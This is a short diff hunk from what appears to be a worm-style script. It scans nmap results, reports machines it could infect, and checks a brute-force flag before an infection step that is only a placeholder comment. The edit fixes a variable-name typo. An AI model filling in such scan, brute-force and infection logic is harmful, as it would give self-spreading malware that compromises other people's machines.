@@ -75,7 +75,7 @@ for entry in listedNmapString:
 		print('ErrorOccured = true')
 		print('Found a possible computer to infect. Trying to infect the machine...')
 		#Try to infect machine here
-		if brutedforced:
+		if bruteforced:
 			print('Infecting the machine...')
 			#Infect the machine here
 
